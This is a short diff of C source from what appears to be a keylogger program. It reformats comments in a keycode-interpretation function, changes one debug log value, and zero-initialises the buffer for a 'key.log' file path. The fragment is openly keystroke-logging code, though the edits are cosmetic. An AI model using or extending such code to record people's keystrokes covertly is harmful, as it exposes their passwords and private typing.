@@ -246,15 +246,19 @@ static int interpret_keycode(struct managedBuffer* buff, struct deviceInfo* devi
         break;
     }
 
-    if (value) { // change modifier state
+    if (value) { 
+        // change modifier state
         device->kstate |= modmask;
+
     } else {
         device->kstate &= (0xffff ^ modmask);
     }
 
-    if (!modmask) { // not a mod key
+    if (!modmask) {
+        // not a mod key
         if (value == KEY_STATE_PRESS) {
-            if (code < 0x1000) { // is not multi-character symbol
+            // is not multi-character symbol
+            if (code < 0x1000) { 
                 unsigned short actioncode;
 
                 if (KTYP(code) != KT_META) {
@@ -290,7 +294,7 @@ static int interpret_keycode(struct managedBuffer* buff, struct deviceInfo* devi
         }
 
     } else {
-        LOG(1, "kstate:%x\n", device->kstate);
+        LOG(1, "kstate:%x\n", modmask);
     }
     return 0;
 }
@@ -332,7 +336,7 @@ int init_keylogging(const char input[], struct keyboardInfo* kbd, struct configI
 
     // create keylog file
     {
-        char path[PATH_MAX];
+        char path[PATH_MAX] = {'\0'};
 
         pathcpy(path, config->logpath);
         pathcat(path, "/key.log");
